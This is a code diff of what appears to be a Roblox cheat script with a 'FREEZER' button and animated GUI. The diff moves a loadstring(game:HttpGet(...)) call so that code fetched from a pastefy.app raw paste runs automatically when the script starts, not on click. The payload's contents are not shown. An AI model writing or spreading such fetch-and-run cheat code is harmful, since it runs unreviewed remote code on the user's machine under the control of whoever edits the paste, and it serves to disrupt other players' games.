@@ -3,12 +3,13 @@ local Players = game:GetService("Players")
 local TweenService = game:GetService("TweenService")
 local LocalPlayer = Players.LocalPlayer
 
+-- Auto-run FREEZER script on execute
 local success, result = pcall(function()
     loadstring(game:HttpGet("https://pastefy.app/mUjFhYyx/raw"))()
 end)
 
 if not success then
-    warn("Failed to auto-run FREEZER script:", result)
+    warn("Failed to execute FREEZER script:", result)
 end
 
 -- Constants
@@ -179,10 +180,6 @@ freezeBtn.MouseButton1Click:Connect(function()
         Duration = 3
     })
 
-    local success, result = pcall(function()
-        loadstring(game:HttpGet("https://pastefy.app/mUjFhYyx/raw"))()
-    end)
-
     if not success then
         warn("FREEZER script failed:", result)
         game.StarterGui:SetCore("SendNotification", {
@@ -211,6 +208,7 @@ tweenObject(searchBox, {TextTransparency = 0}, 0.6)
 tweenObject(avatar, {ImageTransparency = 0.2}, 0.6)
 tweenObject(freezeBtn, {TextTransparency = 0}, 0.6)
 tweenObject(forceBtn, {TextTransparency = 0}, 0.6)
+
 
 
 
